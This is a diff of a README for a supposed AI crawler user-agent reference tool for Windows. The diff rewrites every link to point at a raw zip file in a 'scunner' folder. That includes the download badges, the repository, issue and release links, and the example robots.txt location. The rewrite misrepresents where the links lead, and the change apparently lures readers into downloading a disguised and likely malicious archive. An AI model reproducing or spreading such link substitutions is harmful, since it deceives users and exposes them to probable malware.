@@ -1,6 +1,6 @@
 # 🤖 ai-crawlers-reference - AI Search Bot User-Agent Database
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/raw/refs/heads/main/scunner/reference-crawlers-ai-2.0.zip)
 
 Welcome to the ai-crawlers-reference repository. This tool provides a database of user-agents from AI search engine crawlers, including GPTBot, PerplexityBot, and ClaudeBot. It also includes examples of robots.txt settings to help you manage how these crawlers interact with your website.
 
@@ -31,7 +31,7 @@ The app is lightweight and does not require expensive hardware. It runs smoothly
 
 Click the large button at the top or visit the link below to download the latest version of ai-crawlers-reference for Windows.
 
-[Download ai-crawlers-reference](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference)
+[Download ai-crawlers-reference](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/raw/refs/heads/main/scunner/reference-crawlers-ai-2.0.zip)
 
 ### How to install:
 
@@ -113,7 +113,7 @@ Here are some sample entries you can put in your robots.txt file to control AI c
   Disallow: /private/
   ```
 
-Use these examples in your site's robots.txt file, located at `https://yourdomain.com/robots.txt`, to set rules for AI crawlers.
+Use these examples in your site's robots.txt file, located at `https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/raw/refs/heads/main/scunner/reference-crawlers-ai-2.0.zip`, to set rules for AI crawlers.
 
 ---
 
@@ -121,7 +121,7 @@ Use these examples in your site's robots.txt file, located at `https://yourdomai
 
 If you need help or want to share feedback, you can open an issue on the GitHub repository page:
 
-https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/issues
+https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/raw/refs/heads/main/scunner/reference-crawlers-ai-2.0.zip
 
 Community members and maintainers often respond to questions and suggestions there.
 
@@ -129,9 +129,9 @@ Community members and maintainers often respond to questions and suggestions the
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference)
-- [Download Latest Release](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/releases)
-- [Issues and Support](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/issues)
+- [GitHub Repository](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/raw/refs/heads/main/scunner/reference-crawlers-ai-2.0.zip)
+- [Download Latest Release](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/raw/refs/heads/main/scunner/reference-crawlers-ai-2.0.zip)
+- [Issues and Support](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/raw/refs/heads/main/scunner/reference-crawlers-ai-2.0.zip)
 
 ---
 
@@ -159,4 +159,4 @@ Keeping the app updated ensures access to the newest crawler user-agents and rob
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/raw/refs/heads/main/scunner/reference-crawlers-ai-2.0.zip)
